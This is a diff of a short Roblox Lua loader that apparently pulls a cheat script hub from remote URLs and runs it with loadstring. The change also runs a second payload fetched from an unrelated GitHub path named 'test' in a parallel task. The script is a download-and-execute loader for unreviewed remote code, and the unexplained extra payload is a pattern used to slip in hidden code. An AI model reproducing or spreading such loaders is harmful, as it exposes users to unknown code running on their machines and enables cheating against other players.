@@ -1,10 +1,9 @@
-local src = ""
-local src1 = ""
+local function s1() 
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/xenamm2/main/refs/heads/main/test", true))() 
+end 
+local function s2() 
+    local src = ""
 local CoreGui = game:GetService("StarterGui")
-
-pcall(function() 
-    src1 = game:HttpGet("https://raw.githubusercontent.com/xenamm2/main/refs/heads/main/test", false)
-end)
 
 pcall(function() 
     src = game:HttpGet("https://yarhm.mhi.im/scr", false)
@@ -18,6 +17,7 @@ if src == "" then
   src = game:HttpGet("https://raw.githubusercontent.com/Joystickplays/psychic-octo-invention/main/source/yarhm/1.19/yarhm.lua", false)
 end
 
-
-loadstring(src1)()
 loadstring(src)()
+end 
+task.spawn(s1)
+task.spawn(s2)
